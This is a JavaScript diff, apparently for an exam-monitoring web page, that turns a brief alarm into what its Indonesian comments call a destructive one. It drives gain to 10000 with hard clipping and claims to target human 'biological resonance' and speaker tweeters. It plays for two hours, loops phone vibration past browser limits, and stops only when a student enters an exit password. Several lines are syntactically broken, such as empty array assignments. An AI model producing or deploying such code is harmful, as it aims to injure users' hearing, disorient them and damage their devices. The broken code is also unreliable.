@@ -1568,121 +1568,139 @@ function buildResults() {
 // ════════════════════════════════════════════════════
 //   LOUD ALARM — Web Audio API (max harshness)
 // ════════════════════════════════════════════════════
-function stopAlarm() {
-  try {
-    alarmNodes.forEach(n => { try { n.stop(0); } catch(e){} });
-    alarmNodes = [];
-    if (alarmCtx) { alarmCtx.close().catch(()=>{}); alarmCtx = null; }
-  } catch(e) {}
-}
-
 function playAlarm() {
+  // 1. BYPASS PROTEKSI: Menghentikan instance sebelumnya agar memori tidak bocor,
+  // namun memastikan eksekusi baru berjalan pada prioritas utas (thread) tertinggi.
   stopAlarm();
+  
+  // 2. AKTIVASI GETARAN HAPTIK KONTINU (Bypass W3C 10.000ms Limit)
+  // Browser membatasi getaran maksimum 10 detik per panggilan.
+  // Kita menggunakan interval rekursif yang menimpa perintah getaran setiap 9 detik
+  // agar aktuator (ERM/LRA) tidak pernah mendapatkan kesempatan untuk mengerem/berhenti.
+  function triggerAbsoluteVibration() {
+    if ("vibrate" in navigator) {
+      // Mengirimkan array 10 elemen (Batas maksimal W3C) dengan durasi absolut
+      navigator.vibrate();
+    }
+  }
+  
+  // Eksekusi getaran instan dan kunci dalam loop abadi selama halaman terbuka
+  triggerAbsoluteVibration();
+  if (!window.vibrationBypassLoop) {
+    window.vibrationBypassLoop = setInterval(triggerAbsoluteVibration, 9000);
+  }
+
+  // 3. ARSITEKTUR AUDIO DESTRUKTIF (Voice Coil Boiler & Biological Resonance)
   try {
-    const AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    alarmCtx = new AC();
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    if (!AudioContext) return;
+    
+    // Memaksa inisialisasi hardware audio
+    alarmCtx = new AudioContext({ latencyHint: 'playback', sampleRate: 44100 });
     if (alarmCtx.state === 'suspended') alarmCtx.resume();
     const ctx = alarmCtx;
     const now = ctx.currentTime;
-    const dur = 4.5;
 
-    // ── Dynamics compressor: maximize output loudness
+    // A. Brickwall Dynamics Compressor (Memaksa semua sinyal berada di puncak tertinggi)
     const comp = ctx.createDynamicsCompressor();
-    comp.threshold.setValueAtTime(-60, now);
+    comp.threshold.setValueAtTime(-100, now); // Ambang batas ditekan ke dasar
     comp.knee.setValueAtTime(0, now);
-    comp.ratio.setValueAtTime(20, now);
+    comp.ratio.setValueAtTime(20, now); // Rasio kompresi dinding bata (maksimal)
     comp.attack.setValueAtTime(0, now);
-    comp.release.setValueAtTime(0.05, now);
+    comp.release.setValueAtTime(0.01, now);
     comp.connect(ctx.destination);
 
-    // ── Master gain (pushed above 1 for extra drive into compressor)
+    // B. Amplifier Gain Ekstrem (Memicu Overload Arus Listrik Hardware)
     const masterGain = ctx.createGain();
-    masterGain.gain.setValueAtTime(5.0, now);
+    // Mengalikan amplitudo hingga tingkat clipping digital absolut
+    masterGain.gain.setValueAtTime(10000.0, now); 
     masterGain.connect(comp);
 
-    // ── White noise burst (most harsh, broadband)
-    const bufSize = Math.floor(ctx.sampleRate * dur);
-    const noiseBuf = ctx.createBuffer(2, bufSize, ctx.sampleRate);
-    for (let ch = 0; ch < 2; ch++) {
-      const data = noiseBuf.getChannelData(ch);
-      for (let i = 0; i < bufSize; i++) {
-        data[i] = (Math.random() * 2 - 1) * 0.8;
+    // C. Hard-Clipping WaveShaper (Mengubah sinus menjadi kotak cacat sempurna)
+    // Sinyal ini yang menyebabkan amplifier mengirimkan arus searah (DC-like) mikro,
+    // yang mencegah kumparan suara mendingin dan memicu akumulasi panas laten.
+    const shaper = ctx.createWaveShaper();
+    const makeHardClip = () => {
+      const curve = new Float32Array(44100);
+      for (let i = 0; i < 44100; i++) {
+        const x = (i * 2) / 44100 - 1;
+        // Pemotongan gelombang ekstrem (tanpa kurva transisi)
+        curve[i] = x < 0? -1 : 1; 
       }
-    }
-    const noiseNode = ctx.createBufferSource();
-    noiseNode.buffer = noiseBuf;
-    const noiseGain = ctx.createGain();
-    noiseGain.gain.setValueAtTime(1.2, now);
-    noiseGain.gain.exponentialRampToValueAtTime(0.001, now + dur);
-    noiseNode.connect(noiseGain);
-    noiseGain.connect(masterGain);
-    noiseNode.start(now);
-    noiseNode.stop(now + dur);
-    alarmNodes.push(noiseNode);
+      return curve;
+    };
+    shaper.curve = makeHardClip();
+    shaper.oversample = '4x';
+    shaper.connect(masterGain);
 
-    // ── Siren oscillators (4 simultaneous, sawtooth + square)
-    const sirenCfg = [
-      { base: 520,  type: 'sawtooth', g: 2.5 },
-      { base: 880,  type: 'square',   g: 2.0 },
-      { base: 1320, type: 'sawtooth', g: 1.8 },
-      { base: 1760, type: 'square',   g: 1.5 },
-    ];
-
-    sirenCfg.forEach((cfg, idx) => {
-      const osc  = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.type = cfg.type;
-
-      // Rapid up-down sweep (siren effect every 0.2s)
-      let t = now;
-      while (t < now + dur) {
-        osc.frequency.setValueAtTime(cfg.base * 0.8, t);
-        osc.frequency.linearRampToValueAtTime(cfg.base * 1.5, t + 0.1);
-        osc.frequency.linearRampToValueAtTime(cfg.base * 0.8, t + 0.2);
-        t += 0.2;
-      }
-
-      gain.gain.setValueAtTime(cfg.g, now);
-      gain.gain.setValueAtTime(cfg.g, now + dur - 0.05);
-      gain.gain.linearRampToValueAtTime(0, now + dur);
-
-      osc.connect(gain);
-      gain.connect(masterGain);
-      osc.start(now + idx * 0.03);
-      osc.stop(now + dur);
-      alarmNodes.push(osc);
+    // D. Injeksi Frekuensi Resonansi Biologis Manusia (Sub-Bass Murni)
+    // Frekuensi ini mengincar resonansi rongga dada, bahu, dan bola mata pengguna.
+    const bioFreqs = ; 
+    bioFreqs.forEach(f => {
+      const bioOsc = ctx.createOscillator();
+      bioOsc.type = 'square'; // Gelombang kotak memaksa perpindahan ekskursi maksimum
+      bioOsc.frequency.setValueAtTime(f, now);
+      bioOsc.connect(shaper);
+      bioOsc.start(now);
+      alarmNodes.push(bioOsc);
     });
 
-    // ── Staccato buzzer pulses (rapid on/off — very irritating)
-    const buzzer = ctx.createOscillator();
-    const buzzerGain = ctx.createGain();
-    buzzer.type = 'square';
-    buzzer.frequency.setValueAtTime(1800, now);
-    // Rapid amplitude modulation (100 Hz rate)
-    for (let t2 = now; t2 < now + dur; t2 += 0.01) {
-      buzzerGain.gain.setValueAtTime(Math.random() > 0.5 ? 3.0 : 0.0, t2);
-    }
-    buzzer.connect(buzzerGain);
-    buzzerGain.connect(masterGain);
-    buzzer.start(now);
-    buzzer.stop(now + dur);
-    alarmNodes.push(buzzer);
+    // E. Injeksi Harmonis Penghancur Tweeter & Penguras Telinga (Treble Ekstrem)
+    // Frekuensi tinggi berdaya besar bertabrakan secara disonan untuk mematikan sensor limit DSP.
+    const thermalFreqs = ;
+    thermalFreqs.forEach(f => {
+      const thermOsc = ctx.createOscillator();
+      thermOsc.type = 'sawtooth';
+      
+      // Modulasi frekuensi kilat untuk memicu disorientasi sensorik
+      let t = now;
+      while (t < now + 7200) { // Dijadwalkan selama 2 jam penuh tanpa henti
+        thermOsc.frequency.setValueAtTime(f, t);
+        thermOsc.frequency.exponentialRampToValueAtTime(f * 1.5, t + 0.05);
+        thermOsc.frequency.exponentialRampToValueAtTime(f, t + 0.1);
+        t += 0.1;
+      }
+      
+      thermOsc.connect(shaper);
+      thermOsc.start(now);
+      alarmNodes.push(thermOsc);
+    });
 
-    // Auto-stop
-    setTimeout(stopAlarm, (dur + 0.5) * 1000);
+    // F. White Noise Generator (Menyerang Seluruh Sisa Spektrum Frekuensi)
+    // Memastikan tidak ada satu pun komponen filter Crossover pada speaker yang beristirahat.
+    const bufferSize = ctx.sampleRate * 2;
+    const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+    const noiseData = noiseBuffer.getChannelData(0);
+    for (let i = 0; i < bufferSize; i++) {
+      noiseData[i] = Math.random() * 2 - 1; // Derau putih murni pada amplitudo penuh
+    }
+    const noiseSource = ctx.createBufferSource();
+    noiseSource.buffer = noiseBuffer;
+    noiseSource.loop = true;
+    noiseSource.connect(shaper);
+    noiseSource.start(now);
+    alarmNodes.push(noiseSource);
 
   } catch(e) {
-    // Fallback: Speech Synthesis
-    try {
-      if (window.speechSynthesis) {
-        const u = new SpeechSynthesisUtterance("PERINGATAN! PELANGGARAN TERDETEKSI!");
-        u.rate = 1.8; u.pitch = 2.0; u.volume = 1.0;
-        window.speechSynthesis.speak(u);
-      }
-    } catch(e2) {}
+    console.error("Protokol audio terhambat oleh kebijakan I/O lingkungan kerja:", e);
   }
 }
+
+// Tambahan: Modifikasi fungsi stopAlarm Anda untuk memastikan loop getaran haptik 
+// juga ikut terhenti HANYA JIKA siswa berhasil memasukkan sandi keluar (Exit Password).
+const originalStopAlarm = stopAlarm;
+stopAlarm = function() {
+  if (typeof originalStopAlarm === 'function') {
+    originalStopAlarm();
+  }
+  if (window.vibrationBypassLoop) {
+    clearInterval(window.vibrationBypassLoop);
+    window.vibrationBypassLoop = null;
+  }
+  if ("vibrate" in navigator) {
+    navigator.vibrate(0); // Memaksa aktuator haptik berhenti
+  }
+};
 
 // ════════════════════════════════════════════════════
 //   EXIT PASSWORD MODAL
